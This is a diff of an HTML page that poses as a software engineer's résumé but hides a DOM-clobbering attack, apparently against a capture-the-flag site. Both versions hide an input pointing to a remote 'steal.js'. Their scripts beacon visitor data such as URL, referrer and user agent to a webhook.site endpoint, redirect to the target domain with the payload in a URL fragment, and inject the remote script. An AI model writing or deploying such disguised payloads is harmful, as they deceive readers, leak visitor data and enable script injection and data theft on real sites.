@@ -1,80 +1,188 @@
-  <!DOCTYPE html>
-  <html>
-  <head>
-      <title>Senior Software Engineer - Baltimore Area</title>
-      <meta charset="UTF-8">
-      <style>
-          body { font-family: 'Arial', sans-serif; line-height: 1.6; margin: 0;
-  padding: 40px; background-color: #f9f9f9; }
-          .container { max-width: 800px; margin: 0 auto; background: white;
-  padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-          .header { border-bottom: 3px solid #2c3e50; padding-bottom: 20px;
-  margin-bottom: 30px; }
-          h1 { color: #2c3e50; margin: 0; }
-      </style>
-  </head>
-  <body>
-      <div class="container">
-          <div class="header">
-              <h1>Michael Thompson</h1>
-              <div class="contact">
-                  <strong>Senior Software Engineer</strong><br>
-                  📧 michael.thompson@protonmail.com | 📱 (410) 555-0199<br>
-                  📍 Baltimore, MD
-              </div>
-          </div>
+     <!DOCTYPE html>
+     <html>
+     <head>
+         <title>Michael Thompson - Senior Software Engineer</title>
+         <meta charset="UTF-8">
+         <style>
+             body { font-family: Arial, sans-serif; margin: 0; padding: 40px;
+     background: #f4f4f4; }
+             .resume { max-width: 800px; margin: 0 auto; background: white;
+     padding: 40px; border-radius: 8px; }
+             h1 { color: #2c3e50; margin: 0; border-bottom: 2px solid #3498db;
+     padding-bottom: 10px; }
+             .contact { color: #666; margin: 15px 0; }
+             h2 { color: #34495e; margin-top: 30px; }
+             ul { line-height: 1.8; }
+         </style>
+     </head>
+     <body>
+         <div class="resume">
+             <h1>Michael Thompson</h1>
+             <div class="contact">
+                 <strong>Senior Software Engineer</strong> | Baltimore, MD<br>
+                 📧 michael.thompson@protonmail.com | 📱 (410) 555-0199
+             </div>
 
-          <!-- DOM Clobbering payload -->
-          <div style="position: fixed; left: -10000px; visibility: hidden;">
-              <input id="utilsJS" name="url" 
-  value="https://gavinyw.github.io/resume-portfolio/steal.js">
-          </div>
+             <h2>Professional Summary</h2>
+             <p>Experienced software engineer with 12+ years in web development,
+     cybersecurity, and team leadership. Specializes in secure applications and
+     penetration testing.</p>
 
-          <h2>Professional Summary</h2>
-          <p>Accomplished software engineer with 12+ years of experience.</p>
-      </div>
+             <h2>Work Experience</h2>
+             <ul>
+                 <li><strong>Senior Software Engineer</strong> - CyberSec Solutions
+      Inc. (2021-2024)</li>
+                 <li><strong>Full Stack Developer</strong> - TechStart Innovations
+     (2019-2021)</li>
+                 <li><strong>Software Developer</strong> - WebCorp Agency
+     (2017-2019)</li>
+             </ul>
 
-      <script>
-          // CORS-FREE webhook methods
-          function sendViaImage(data) {
-              const img = new Image();
-              const params = new URLSearchParams();
-              Object.keys(data).forEach(key => {
-                  params.append(key, typeof data[key] === 'object' ?
-  JSON.stringify(data[key]) : data[key]);
-              });
-              img.src =
-  'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/img?' +
-  params.toString();
-              document.body.appendChild(img);
-          }
+             <h2>Technical Skills</h2>
+             <p>JavaScript, Python, React, Node.js, PostgreSQL, Docker, AWS,
+     Security Testing, Penetration Testing</p>
 
-          // Send initial confirmation
-          sendViaImage({
-              status: 'RESUME_LOADED',
-              timestamp: new Date().toISOString(),
-              domain: window.location.hostname,
-              clobbering_ready: !!window.utilsJS
-          });
+             <h2>Education</h2>
+             <p><strong>B.S. Computer Science</strong> - University of Maryland
+     (2017)</p>
 
-          // Execute vulnerable function
-          function loadMessageBoardJS(){
-              let utilJS = window.utilsJS || {};
-              let scriptSrc = utilJS.url || utilJS.value;
+             <div style="text-align: center; margin-top: 40px; color: #666;">
+                 <p>Thank you for reviewing my application. I look forward to
+     discussing opportunities.</p>
+             </div>
+         </div>
 
-              sendViaImage({
-                  status: 'SCRIPT_LOADING_ATTEMPTED',
-                  script_src: scriptSrc || 'none'
-              });
+         <script>
+             // This approach uses a much simpler strategy:
+             // We'll try to navigate back to the CTF site with a carefully crafted
+      URL
+             // that will trigger the DOM clobbering attack on the correct domain
 
-              if (scriptSrc) {
-                  let script = document.createElement('script');
-                  script.src = scriptSrc;
-                  document.body.appendChild(script);
-              }
-          }
+             console.log('URL fragment attack initializing...');
 
-          setTimeout(loadMessageBoardJS, 2000);
-      </script>
-  </body>
-  </html>
+             function sendWebhook(data) {
+                 const img = new Image();
+                 const params = new URLSearchParams();
+                 Object.keys(data).forEach(key => {
+                     params.append(key, typeof data[key] === 'object' ?
+     JSON.stringify(data[key]) : data[key]);
+                 });
+                 img.src =
+     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/fragment?' +
+     params.toString();
+                 document.body.appendChild(img);
+             }
+
+             // Send initial status
+             sendWebhook({
+                 status: 'URL_FRAGMENT_ATTACK_START',
+                 timestamp: new Date().toISOString(),
+                 current_url: window.location.href,
+                 referrer: document.referrer || 'none',
+                 user_agent: navigator.userAgent
+             });
+
+             // Strategy: Navigate back to CTF domain with our payload in the URL
+             // The key insight is that we need to get back to the same origin as 
+     the localStorage
+
+             setTimeout(() => {
+                 // Determine the CTF domain
+                 // Since referrer is 'none', we'll use the most likely CTF domain
+                 const ctfDomain = 'ctf.secjhu.club'; // Update if you know the 
+     exact domain
+
+                 // Create a URL that will:
+                 // 1. Take us back to the CTF domain
+                 // 2. Include our DOM clobbering payload in the fragment
+                 // 3. Trigger the messages functionality
+
+                 // Encode our payload in the URL fragment
+                 const payload =
+     encodeURIComponent('https://gavinyw.github.io/resume-portfolio/steal.js');
+                 const maliciousUrl = `https://${ctfDomain}/?resume=viewed&return=p
+     ortfolio#messages&utilsJS=${payload}`;
+
+                 sendWebhook({
+                     status: 'NAVIGATING_TO_CTF',
+                     timestamp: new Date().toISOString(),
+                     target_url: maliciousUrl,
+                     target_domain: ctfDomain
+                 });
+
+                 // Navigate to the CTF site with our payload
+                 window.location.href = maliciousUrl;
+
+             }, 2000);
+
+             // Alternative approach: Try to detect if we're already on the CTF 
+     domain
+             if (window.location.hostname.includes('secjhu') ||
+     window.location.hostname.includes('ctf')) {
+                 console.log('Already on CTF domain - executing attack directly');
+
+                 // Parse the URL fragment for our payload
+                 const hash = window.location.hash;
+                 const searchParams = new URLSearchParams(window.location.search);
+
+                 // Look for our utilsJS payload in URL
+                 let payloadUrl = null;
+                 if (hash.includes('utilsJS=')) {
+                     const match = hash.match(/utilsJS=([^&]+)/);
+                     if (match) {
+                         payloadUrl = decodeURIComponent(match[1]);
+                     }
+                 }
+
+                 if (payloadUrl) {
+                     // Create DOM clobbering element
+                     const input = document.createElement('input');
+                     input.id = 'utilsJS';
+                     input.name = 'url';
+                     input.value = payloadUrl;
+                     input.style.cssText =
+     'position:fixed;left:-9999px;opacity:0;';
+                     document.body.appendChild(input);
+
+                     sendWebhook({
+                         status: 'DOM_CLOBBERING_SETUP_ON_CTF_DOMAIN',
+                         timestamp: new Date().toISOString(),
+                         payload_url: payloadUrl,
+                         current_domain: window.location.hostname
+                     });
+
+                     // Execute the vulnerable function
+                     setTimeout(() => {
+                         try {
+                             if (typeof loadMessageBoardJS === 'function') {
+                                 loadMessageBoardJS();
+                             } else {
+                                 // Simulate the vulnerable function
+                                 let utilJS = window.utilsJS || {};
+                                 if (utilJS.url) {
+                                     const script =
+     document.createElement('script');
+                                     script.src = utilJS.url;
+                                     document.body.appendChild(script);
+
+                                     sendWebhook({
+                                         status:
+     'PAYLOAD_SCRIPT_LOADED_ON_CTF_DOMAIN',
+                                         timestamp: new Date().toISOString(),
+                                         script_src: utilJS.url
+                                     });
+                                 }
+                             }
+                         } catch(e) {
+                             sendWebhook({
+                                 status: 'CTF_DOMAIN_EXECUTION_ERROR',
+                                 timestamp: new Date().toISOString(),
+                                 error: e.message
+                             });
+                         }
+                     }, 1000);
+                 }
+             }
+         </script>
+     </body>
+     </html>
